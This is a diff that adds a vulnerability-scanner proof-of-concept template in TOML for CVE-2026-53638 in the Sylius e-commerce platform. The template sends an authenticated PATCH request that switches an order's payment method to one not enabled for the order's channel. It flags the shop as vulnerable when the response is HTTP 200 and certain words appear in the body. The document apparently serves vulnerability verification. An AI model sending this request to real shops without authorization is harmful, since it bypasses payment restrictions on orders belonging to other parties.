@@ -1,0 +1,48 @@
+[info]
+author = "ave"
+description = "验证已认证顾客通过 PATCH /api/v2/shop/account/orders/{tokenValue}/payments/{paymentId} 将订单支付方式改为未对该订单渠道启用的全局支付方式。易受影响版本返回 HTTP 200 并接受变更；正确实现（如结账端点或已修复版本）应返回 HTTP 422 拒绝。"
+id = "POC-AVE-2026-0424"
+name = "CVE-2026-53638 Sylius 店铺账户订单支付方式渠道限制绕过 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-53638",
+    "sylius",
+    "auth-bypass",
+    "api",
+]
+vuln_id = [
+    "CVE-2026-53638",
+    "AVE-2026-0424",
+    "GHSA-6955-hrm5-c4qp",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PATCH"
+path = "/{{BaseURL}}/api/v2/shop/account/orders/{{tokenValue}}/payments/{{paymentId}}"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"paymentMethod":"{{outOfChannelPaymentMethodCode}}"}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Authorization = "Bearer {{token}}"
+Content-Type = "application/merge-patch+json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "paymentMethod",
+    "tokenValue",
+]
